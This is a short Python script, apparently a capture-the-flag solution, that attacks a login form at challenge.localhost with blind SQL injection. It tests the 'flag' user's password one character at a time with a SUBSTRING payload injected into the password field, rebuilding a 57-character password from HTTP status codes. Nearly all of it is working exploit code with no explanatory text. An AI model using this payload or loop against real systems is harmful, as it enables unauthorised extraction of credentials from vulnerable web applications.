import urllib.parse
import requests

method = "POST"
site = "http://challenge.localhost"
port = 80
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
url = f"{site}:{port}/"

# Check blindly.
# data = {'username': 'flag', 'password': '" or SUBSTRING((SELECT password FROM Users WHERE username = \'flag\'), 1, 1) = \'p\' --'}
# Checked!

# Bruteforce:
password_length = 57
char_position = 13
password = ""
char_set = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_.+-=|;:,!@#$%^&*()/\\\{\}'

for index in range (1, password_length + 1):
    for char in char_set:

        data = {'username': 'flag', 'password': f'" or SUBSTRING((SELECT password FROM Users WHERE username = \'flag\'), {index}, 1) = \'{char}\' --'}
        response = requests.request(method, url, headers = headers, data = data)
        
        if response.status_code == 200:
            password += char

print(f"Password: {password}")
